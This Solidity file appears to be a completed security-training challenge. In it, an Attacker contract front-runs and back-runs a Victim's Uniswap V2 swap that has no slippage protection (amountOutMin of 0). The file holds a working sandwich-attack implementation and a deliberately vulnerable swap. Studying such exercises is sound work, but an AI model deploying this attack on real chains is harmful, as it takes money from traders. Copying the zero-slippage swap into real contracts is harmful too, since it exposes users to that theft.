// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./interfaces/IERC20.sol";

/**
 *
 *  SANDWICH ATTACK AGAINST A SWAP TRANSACTION
 *
 * We have two contracts: Victim and Attacker. Both contracts have an initial balance of 1000 WETH. The Victim contract
 * will swap 1000 WETH for USDC, setting amountOutMin = 0.
 * The challenge is use the Attacker contract to perform a sandwich attack on the victim's
 * transaction to make profit.
 *
 */

 /* 
  Approach:
  1. Attacker needs to send the frontrun transation with higher gas price than the victim's transaction.
  2. Manipulate the price of the token such that the victiom get 0 price (he has set the minimum price to 0)
  Now how to do that ?
  That can be done by making the reserves of token to 0
  3. The backrun transaction should be sent after the frontrun transaction and before the victim's transaction is mined which is done by sending the backrun with lower gas price.
  

  0 here did not mean we need to tilt the transaction so that victim gets zero. It specifies that the victim has no slippage protection and will accept any price for the tokens. we just
  needed to make sure to change the liquidity heavily
  
   */
contract Attacker {
    // This function will be called before the victim's transaction.
    function frontrun(address router, address weth, address usdc) public {

        IUniswapV2Router uniswapRouter = IUniswapV2Router(router);
         
        // your code here
        IERC20(weth).approve(router , 1000 ether);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = usdc;
        uniswapRouter.swapExactTokensForTokens(1000 ether, 0, path, address(this), block.timestamp + 1 minutes);

    }

    // This function will be called after the victim's transaction.
    function backrun(address router, address weth, address usdc) public {
        // your code here
        IUniswapV2Router uniswapRouter = IUniswapV2Router(router);

        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = weth;
        
        uint liquidity = IERC20(usdc).balanceOf(address(this));
        IERC20(usdc).approve(router, liquidity);
        uniswapRouter.swapExactTokensForTokens(liquidity, 0, path, address(this), block.timestamp + 1 minutes);
    }
}

contract Victim {
    address public immutable router;

    constructor(address _router) {
        router = _router;
    }

    function performSwap(address[] calldata path) public {
        IUniswapV2Router(router).swapExactTokensForTokens(
            1000 * 1e18, 0, path, address(this), block.timestamp + 1 minutes
        );
    }
}

interface IUniswapV2Router {
    /**
     *     amountIn: the amount to use for swap.
     *     amountOutMin: the minimum amount of output tokens that must be received for the transaction not to revert.
     *     path: an array of token addresses. In our case, WETH and USDC.
     *     to: recipient address to receive the liquidity tokens.
     *     deadline: timestamp after which the transaction will revert.
     */
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}
